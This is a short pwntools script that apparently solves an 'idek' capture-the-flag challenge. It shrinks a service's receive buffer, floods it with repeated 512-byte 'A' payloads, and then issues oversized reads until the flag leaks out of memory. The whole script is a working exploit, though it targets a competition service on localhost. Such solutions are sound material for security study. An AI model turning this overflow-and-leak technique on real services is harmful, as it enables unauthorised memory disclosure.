#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'

HOST = args.HOST or '127.0.0.1'
PORT = args.PORT or 1337

conn = remote(HOST, PORT)

# Set receive buffer to 16
conn.sendlineafter(b'> ', b'2')
conn.sendlineafter(b'Buffer size> ', b'16')

# Connect
conn.sendlineafter(b'> ', b'1')

# Send 8 * 512
for _ in range(8):
    # Send 'A' * 512
    conn.sendlineafter(b'> ', b'4')
    conn.sendlineafter(b'Data> ', b'A' * 512)

# Recv 3 * 10240
for _ in range(3):
    conn.sendlineafter(b'> ', b'5')
    conn.sendlineafter(b'Size> ', b'10240')
    conn.recvuntil(b'Select Option:')


conn.sendlineafter(b'> ', b'5')
conn.sendlineafter(b'Size> ', b'10240')
conn.recvuntil(b'idek{')
print(b'idek{'+conn.recvuntil(b'}'))